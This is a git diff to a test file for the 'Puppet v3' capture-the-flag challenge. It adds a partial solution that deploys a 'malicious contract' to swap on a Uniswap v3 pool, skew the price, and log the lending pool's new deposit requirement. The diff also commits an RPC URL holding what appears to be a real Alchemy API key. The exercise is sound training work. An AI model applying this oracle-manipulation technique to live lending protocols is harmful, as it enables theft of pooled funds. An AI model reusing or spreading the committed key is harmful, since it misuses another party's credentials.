@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/PLCbmZb-_jTxXpzuc1c_Bj1BzTJC94mJ";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +140,36 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Uniswap Pool has 100 ETH and 100 DVT (1:1)
+        // Player has 1 ETH and 110 DVT
+        // Lending pool has 1,000,000 DVT
+
+        // Deploy malicious contract
+        const playerContract = await (await ethers.getContractFactory("PlayerContract")).deploy(uniswapPool.address, token.address);
+
+        // Send all DVT tokens to the contract
+        const sendTokens = await token.connect(player).transfer(playerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        const preBalance = await token.balanceOf(playerContract.address);
+
+        // Execute the call to uniswap Pool
+        const sqrtPrice = await playerContract.getSlot0();
+        console.log("Sqrt price: ", sqrtPrice);
+        const swap = await playerContract.executeSwap();
+        console.log("Swap: ", swap);
+
+        // weth = (await ethers.getContractFactory('WETH', deployer)).attach("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");
+        const postBalance = await token.balanceOf(playerContract.address);
+        const poolBalanceDVT = await token.balanceOf(uniswapPool.address);
+        const poolBalanceETH = await weth.balanceOf(uniswapPool.address);
+        console.log("Pre-swap Balance Player: ", Number(preBalance) / 10 ** 18)
+        console.log("Post-swap Balance Player: ", Number(postBalance) / 10 ** 18);
+        console.log("Uniswap DVT: ", Number(poolBalanceDVT) / 10 ** 18);
+        console.log("Uniswap ETH: ", Number(poolBalanceETH) / 10 ** 18);
+
+        const newPrice = await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        console.log("New Price: ", Number(newPrice) / 10 ** 18);
+
     });
 
     after(async function () {
